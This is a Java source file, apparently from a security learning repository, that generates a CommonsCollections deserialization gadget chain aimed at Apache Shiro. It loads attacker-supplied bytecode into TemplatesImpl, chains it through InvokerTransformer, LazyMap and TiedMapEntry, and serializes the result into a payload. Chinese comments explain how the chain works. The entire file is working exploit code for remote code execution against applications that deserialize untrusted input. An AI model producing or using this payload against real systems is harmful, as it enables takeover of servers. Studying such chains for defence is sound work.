package com.govuln.shiroattack;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollectionsShiro {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    /**
     * HashMap#readObject()
     * HashMap#hash(key)
     *      TiedMapEntry#hashCode()
     *      TiedMapEntry#getValue()
     *          LazyMap#get(key)
     *              InvokerTransformer#transform()
     *                  TemplatesImpl#newTransformer()
     *
     *  前面和cc6一样，不明白为啥选了cc6.
     */
    public byte[] getPayload(byte[] clazzBytes) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{clazzBytes});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        Transformer transformer = new InvokerTransformer("getClass", null, null);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformer);


        // obj作为tiedMapEntry的key就是巧妙之处
        // outerMap.get(obj) --> lazyMap.get(obj) --> invokerTransformer.transform(obj) --> newTransformer().invoke(obj)
        // 之前需要数组是因为要保证newTransformer().invoke(xxx)这里的xxx是TemplatesImpl，所以用ConstantTransformer去固定它
        // 但是当obj作为lazy的key的时候，刚好可以被传进newTransformer().invoke(xxx)，ConstantTransformer了，也即不再需要数组了。

        TiedMapEntry tme = new TiedMapEntry(outerMap, obj);

        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");

        outerMap.clear();
        setFieldValue(transformer, "iMethodName", "newTransformer");

        // ==================
        // 生成序列化字符串
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();

        return barr.toByteArray();
    }
}